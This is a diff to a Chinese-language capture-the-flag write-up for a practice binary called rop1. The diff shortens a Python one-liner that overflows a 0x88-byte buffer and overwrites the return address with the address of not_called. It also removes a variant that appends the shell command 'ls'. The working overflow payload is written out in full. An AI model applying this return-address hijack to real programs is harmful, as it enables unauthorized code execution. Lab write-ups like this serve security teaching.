@@ -60,17 +60,11 @@ int main(int argc, char** argv) {
 \           0x080484e0      ret
 ```
 
-因此首先使用 0x88 个字节把缓冲区填满，4 个字节填满 ebp，后面 4 个字节填上 `not_called` 的地址。由于 `read` 需要读取 256 个字节，再把剩下的字节随便填上即可：
+因此首先使用 0x88 个字节把缓冲区填满，4 个字节填满 ebp，后面 4 个字节填上 `not_called` 的地址：
 
 ```python
-(python -c "print '0' * 0x88 + '0000\xa4\x84\x04\x08' + '0' * (256 - 0x88 - 8)";cat) | ./rop1-fa6168f4d8eba0eb
-                               ↑EBP ↑----返回地址----↑    ↑缓冲区剩余部分
-```
-
-不过这条命令在 Ubuntu 18.04 中会有点问题，`cat` 无法继续读入 `stdin` 的内容。这时可以直接将要执行的命令添加在 python 的字符串后面，比如
-
-```python
-python -c "print '0' * 0x88 + '0000\xa4\x84\x04\x08' + '0' * (256 - 0x88 - 8) + 'ls'" | ./rop1-fa6168f4d8eba0eb
+(python -c "print '0' * 0x88 + '0000\xa4\x84\x04\x08\n'";cat) | ./rop1-fa6168f4d8eba0eb
+                               ↑EBP ↑----返回地址----↑ 
 ```
 
 {% include writeup_end.html %}
